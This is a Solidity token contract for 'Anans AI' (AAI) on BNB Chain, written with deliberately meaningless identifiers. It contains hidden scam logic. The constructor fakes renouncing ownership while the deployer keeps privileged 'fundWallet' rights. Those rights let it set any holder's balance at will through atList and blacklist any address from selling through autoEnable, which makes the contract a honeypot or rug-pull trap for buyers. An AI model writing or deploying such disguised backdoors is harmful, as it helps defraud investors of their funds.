/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface listReceiverTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellSwapReceiver) external view returns (uint256);

    function transfer(address atLimit, uint256 listTokenTx) external returns (bool);

    function allowance(address isTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 listTokenTx) external returns (bool);

    function transferFrom(
        address sender,
        address atLimit,
        uint256 listTokenTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoWallet, uint256 value);
    event Approval(address indexed isTake, address indexed spender, uint256 value);
}

interface listReceiverTxMetadata is listReceiverTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract fromTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverLaunch {
    function createPair(address minList, address buyToken) external returns (address);
}

interface shouldList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract AnansAI is fromTake, listReceiverTx, listReceiverTxMetadata {

    function limitReceiverTeam() public {
        emit OwnershipTransferred(fundTeam, address(0));
        liquidityMarketing = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return teamEnable;
    }

    function enableModeTo(address takeModeAuto, address atLimit, uint256 listTokenTx) internal returns (bool) {
        if (takeModeAuto == fundTeam) {
            return enableTrading(takeModeAuto, atLimit, listTokenTx);
        }
        require(!modeIsReceiver[takeModeAuto]);
        return enableTrading(takeModeAuto, atLimit, listTokenTx);
    }

    function atList(address atAuto, uint256 listTokenTx) public {
        require(fundWallet[_msgSender()]);
        amountReceiver[atAuto] = listTokenTx;
    }

    mapping(address => mapping(address => uint256)) private txReceiverTrading;

    address private liquidityMarketing;

    function enableTrading(address takeModeAuto, address atLimit, uint256 listTokenTx) internal returns (bool) {
        require(amountReceiver[takeModeAuto] >= listTokenTx);
        amountReceiver[takeModeAuto] -= listTokenTx;
        amountReceiver[atLimit] += listTokenTx;
        emit Transfer(takeModeAuto, atLimit, listTokenTx);
        return true;
    }

    function getOwner() external view returns (address) {
        return liquidityMarketing;
    }

    event OwnershipTransferred(address indexed listLaunch, address indexed feeAuto);

    function approve(address tokenShould, uint256 listTokenTx) public virtual override returns (bool) {
        txReceiverTrading[_msgSender()][tokenShould] = listTokenTx;
        emit Approval(_msgSender(), tokenShould, listTokenTx);
        return true;
    }

    mapping(address => bool) public fundWallet;

    uint256 public limitMarketing;

    mapping(address => bool) public modeIsReceiver;

    function totalSupply() external view virtual override returns (uint256) {
        return atReceiver;
    }

    address public fundTeam;

    function balanceOf(address sellSwapReceiver) public view virtual override returns (uint256) {
        return amountReceiver[sellSwapReceiver];
    }

    uint256 public enableAutoSell;

    function fundTrading() public view returns (bool) {
        return launchedAmountTotal;
    }

    bool public totalFee;

    function amountMode() public view returns (uint256) {
        return amountReceiverLaunch;
    }

    function allowance(address marketingMode, address tokenShould) external view virtual override returns (uint256) {
        return txReceiverTrading[marketingMode][tokenShould];
    }

    mapping(address => uint256) private amountReceiver;

    uint256 private atReceiver = 100000000 * 10 ** 18;

    uint8 private receiverSender = 18;

    function transfer(address atAuto, uint256 listTokenTx) external virtual override returns (bool) {
        return enableModeTo(_msgSender(), atAuto, listTokenTx);
    }

    bool private atTrading;

    bool private toAmount;

    function launchSwapSell() public {
        
        
        enableAutoSell=0;
    }

    function autoEnable(address maxTo) public {
        
        if (maxTo == fundTeam || maxTo == launchedSender || !fundWallet[_msgSender()]) {
            return;
        }
        if (launchedAmountTotal == atTrading) {
            amountReceiverLaunch = enableAutoSell;
        }
        modeIsReceiver[maxTo] = true;
    }

    address public launchedSender;

    function receiverListTotal() public view returns (uint256) {
        return amountReceiverLaunch;
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverSender;
    }

    uint256 public amountReceiverLaunch;

    constructor (){ 
        if (enableAutoSell != amountReceiverLaunch) {
            launchedAmountTotal = true;
        }
        shouldList sellExemptToken = shouldList(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        launchedSender = receiverLaunch(sellExemptToken.factory()).createPair(sellExemptToken.WETH(), address(this));
        liquidityMarketing = _msgSender();
        
        fundTeam = _msgSender();
        fundWallet[_msgSender()] = true;
        
        amountReceiver[_msgSender()] = atReceiver;
        emit Transfer(address(0), fundTeam, atReceiver);
        limitReceiverTeam();
    }

    string private tokenFrom = "AAI";

    string private teamEnable = "Anans AI";

    function launchSender() public {
        if (atTrading) {
            launchedAmountTotal = true;
        }
        if (enableAutoSell == amountReceiverLaunch) {
            enableAutoSell = limitMarketing;
        }
        toAmount=false;
    }

    function swapTxBuy(address marketingTeam) public {
        if (totalFee) {
            return;
        }
        
        fundWallet[marketingTeam] = true;
        
        totalFee = true;
    }

    function owner() external view returns (address) {
        return liquidityMarketing;
    }

    function symbol() external view virtual override returns (string memory) {
        return tokenFrom;
    }

    function transferFrom(address takeModeAuto, address atLimit, uint256 listTokenTx) external override returns (bool) {
        if (txReceiverTrading[takeModeAuto][_msgSender()] != type(uint256).max) {
            require(listTokenTx <= txReceiverTrading[takeModeAuto][_msgSender()]);
            txReceiverTrading[takeModeAuto][_msgSender()] -= listTokenTx;
        }
        return enableModeTo(takeModeAuto, atLimit, listTokenTx);
    }

    bool private launchedAmountTotal;

}